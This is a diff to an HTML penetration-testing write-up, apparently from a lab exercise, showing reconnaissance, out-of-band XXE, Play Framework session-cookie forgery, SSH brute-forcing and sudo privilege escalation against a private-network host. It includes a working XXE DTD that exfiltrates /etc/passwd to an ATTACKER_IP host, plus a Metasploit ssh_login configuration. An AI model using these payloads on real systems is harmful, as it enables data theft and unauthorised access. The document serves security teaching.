@@ -119,101 +119,191 @@
         <h2 class="section-title">Attack Phases</h2>
 
         <h3>1. Reconnaissance</h3>
-        <p>
-            The reconnaissance phase began with identifying active services on
-            the target machine using Nmap.
-        </p>
 
-        <pre><code class="output">nmap -sC -sV 192.168.1.177 > nmap.txt</code></pre>
+<p>
+    The first phase of the attack focused on reconnaissance and service discovery.
+    The goal was to identify exposed network services, application technologies,
+    and potential entry points for exploitation.
+</p>
 
-        <img src="images/image8.png" alt="Nmap results">
-        <p><strong>Figure 4.1:</strong> Nmap scan results</p>
+<p>
+    An initial TCP scan was performed using <strong>Nmap</strong> with default scripts
+    and version detection enabled:
+</p>
 
-        <p>
-            Open services included SSH (22), HTTP (80), and MySQL (3306).
-            A directory brute-force was then performed using Dirb.
-        </p>
+<pre><code class="command">nmap -sC -sV 192.168.1.177 -oN nmap.txt</code></pre>
 
-        <img src="images/image9.png" alt="Dirb results">
-        <p><strong>Figure 4.2:</strong> Dirb directory enumeration</p>
+<p>
+    The scan revealed multiple open services, most notably:
+</p>
 
-        <img src="images/image10.png" alt="Web login page">
-        <p><strong>Figure 4.3:</strong> Web application login page</p>
+<ul class="features-list">
+    <li>SSH service running on port 22</li>
+    <li>HTTP web application on port 80</li>
+    <li>MySQL database service on port 3306</li>
+</ul>
+
+<img src="images/image8.png" alt="Nmap results">
+<p><strong>Figure 4.1:</strong> Nmap scan results identifying exposed services</p>
+
+<p>
+    Since a web service was available, directory enumeration was performed
+    to identify hidden endpoints and application functionality.
+</p>
+
+<pre><code class="command">dirb http://192.168.1.177/</code></pre>
+
+<img src="images/image9.png" alt="Dirb results">
+<p><strong>Figure 4.2:</strong> Directory enumeration revealing application paths</p>
+
+<p>
+    The enumeration results pointed to a login interface, indicating the presence
+    of authentication logic and session handling mechanisms.
+</p>
+
+<img src="images/image10.png" alt="Web login page">
+<p><strong>Figure 4.3:</strong> Web application login page</p>
+
 
         <h3>2. XXE Exploitation (Out-of-Band)</h3>
-        <p>
-            After intercepting a login request with Burp Suite, the content type
-            was modified to <code>text/xml</code>, and a crafted XML payload was sent.
-            Although in-band exfiltration was blocked, OOB XXE was still possible.
-        </p>
 
-        <img src="images/image11.png" alt="XXE OOB behavior">
-        <p><strong>Figure 4.4:</strong> Out-of-Band XXE attack behavior</p>
+<p>
+    During request interception with <strong>Burp Suite</strong>, it was observed that
+    the backend endpoint accepted XML payloads in addition to JSON.
+    This behavior is particularly dangerous when XML parsers are not securely configured.
+</p>
 
-        <img src="images/image12.png" alt="Malicious DTD">
-        <p><strong>Figure 4.5:</strong> External DTD hosted on attacker server</p>
+<p>
+    The original request was modified by changing the
+    <code>Content-Type</code> header to <code>text/xml</code>, allowing a crafted
+    XML payload to be processed by the server.
+</p>
 
-        <img src="images/image13.png" alt="Modified XML">
-        <p><strong>Figure 4.6:</strong> XML modified to reference attacker DTD</p>
+<p>
+    Initial attempts at in-band XXE failed due to server-side output restrictions.
+    However, the application remained vulnerable to
+    <strong>Out-of-Band (OOB) XXE</strong>, which allows data exfiltration through
+    external network requests.
+</p>
 
-        <img src="images/image14.png" alt="passwd file">
-        <p><strong>Figure 4.7:</strong> Contents of /etc/passwd exfiltrated via XXE</p>
+<img src="images/image11.png" alt="XXE OOB behavior">
+<p><strong>Figure 4.4:</strong> Out-of-Band XXE request reaching the attacker server</p>
+
+<p>
+    An external DTD was hosted on the attacker machine using Python’s built-in HTTP server:
+</p>
+
+<pre><code class="command">python3 -m http.server 80</code></pre>
+
+<p>
+    The malicious DTD defined an external entity pointing to sensitive files
+    on the target system:
+</p>
+
+<pre><code class="input">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP/?data=%file;'>">
+%eval;
+</code></pre>
+
+<img src="images/image12.png" alt="Malicious DTD">
+<p><strong>Figure 4.5:</strong> External DTD used for XXE file exfiltration</p>
+
+<p>
+    The intercepted XML request was then modified to reference the external DTD:
+</p>
+
+<img src="images/image13.png" alt="Modified XML">
+<p><strong>Figure 4.6:</strong> XML request referencing attacker-controlled DTD</p>
+
+<p>
+    As a result, the contents of <code>/etc/passwd</code> were successfully exfiltrated
+    to the attacker’s HTTP server.
+</p>
+
+<img src="images/image14.png" alt="passwd file">
+<p><strong>Figure 4.7:</strong> /etc/passwd exfiltrated via XXE</p>
+
 
         <h3>3. Session Cookie Forgery</h3>
-        <p>
-            Using the same XXE technique, the file <code>application.conf</code>
-            was retrieved, revealing the Play Framework secret key.
-        </p>
 
-        <img src="images/image15.png" alt="application.conf">
-        <p><strong>Figure 4.8:</strong> Contents of application.conf</p>
+<p>
+    Play Framework uses <strong>stateless client-side sessions</strong>,
+    meaning all session data is stored inside a signed cookie.
+    While encrypted, this design becomes critically insecure
+    if the application secret key is compromised.
+</p>
 
-        <p>
-            By analyzing the Play Framework source code, it was possible to
-            recreate the cookie signing logic and generate a valid admin session.
-        </p>
+<p>
+    Using the same XXE technique, the file
+    <code>application.conf</code> was retrieved from the server.
+    This file contained the application’s secret signing key.
+</p>
 
-        <img src="images/image16.png" alt="Login function">
-        <p><strong>Figure 4.9:</strong> Login function in controller</p>
+<img src="images/image15.png" alt="application.conf">
+<p><strong>Figure 4.8:</strong> application.conf revealing Play Framework secret key</p>
 
-        <img src="images/image17.png" alt="Session class">
-        <p><strong>Figure 4.10:</strong> Session class from Play Framework</p>
+<p>
+    After reviewing the Play Framework source code, the session cookie
+    generation logic was identified.
+    The signing algorithm was then reimplemented in Python.
+</p>
 
-        <img src="images/image18.png" alt="Encode function">
-        <p><strong>Figure 4.11:</strong> Cookie encoding function</p>
+<ul class="features-list">
+    <li>Session data serialized as key-value pairs</li>
+    <li>HMAC-based signing using application secret</li>
+    <li>No server-side session validation</li>
+</ul>
 
-        <img src="images/image19.png" alt="Sign function">
-        <p><strong>Figure 4.12:</strong> Cookie signing function</p>
+<img src="images/image20.png" alt="Python recreation">
+<p><strong>Figure 4.13:</strong> Cookie signing logic recreated in Python</p>
 
-        <img src="images/image20.png" alt="Python recreation">
-        <p><strong>Figure 4.13:</strong> Signing function recreated in Python</p>
+<p>
+    A forged administrator session cookie was generated and manually injected
+    into the browser using the developer tools.
+</p>
 
-        <img src="images/image21.png" alt="Cookie insertion">
-        <p><strong>Figure 4.14:</strong> Forged session cookie added to browser</p>
+<img src="images/image21.png" alt="Cookie insertion">
+<p><strong>Figure 4.14:</strong> Forged session cookie inserted into browser</p>
 
-        <img src="images/image22.png" alt="Admin access">
-        <p><strong>Figure 4.15:</strong> Administrator access obtained</p>
+<img src="images/image22.png" alt="Admin access">
+<p><strong>Figure 4.15:</strong> Administrative access successfully obtained</p>
 
-        <h3>4. Post-Exploitation</h3>
-        <p>
-            Using credentials discovered during enumeration, an SSH brute-force
-            attack was executed using Metasploit.
-        </p>
 
-        <img src="images/image23.png" alt="Metasploit modules">
-        <p><strong>Figure 4.16:</strong> SSH login modules in Metasploit</p>
+<h3>4. Post-Exploitation</h3>
 
-        <img src="images/image24.png" alt="Module options">
-        <p><strong>Figure 4.17:</strong> Metasploit module configuration</p>
+<p>
+    After gaining administrative access to the application,
+    the final phase focused on achieving system-level access.
+</p>
 
-        <img src="images/image25.png" alt="Brute-force success">
-        <p><strong>Figure 4.18:</strong> Successful SSH brute-force</p>
+<p>
+    Previously discovered usernames were tested against the SSH service
+    using Metasploit’s SSH login module.
+</p>
 
-        <img src="images/image26.png" alt="Shadow file">
-        <p><strong>Figure 4.19:</strong> /etc/shadow contents</p>
+<img src="images/image23.png" alt="Metasploit modules">
+<p><strong>Figure 4.16:</strong> SSH login modules in Metasploit</p>
 
-        <img src="images/image27.png" alt="Root access">
-        <p><strong>Figure 4.20:</strong> Privilege escalation using sudo</p>
+<pre><code class="command">
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.1.177
+set USER_FILE users.txt
+set PASS_FILE passwords.txt
+run
+</code></pre>
+
+<img src="images/image25.png" alt="Brute-force success">
+<p><strong>Figure 4.18:</strong> Successful SSH authentication</p>
+
+<p>
+    Once logged in, privilege escalation was achieved using
+    misconfigured sudo permissions.
+</p>
+
+<img src="images/image27.png" alt="Root access">
+<p><strong>Figure 4.20:</strong> Root privileges obtained</p>
+
 
         <h2 class="section-title">Tools Used</h2>
         <ul>
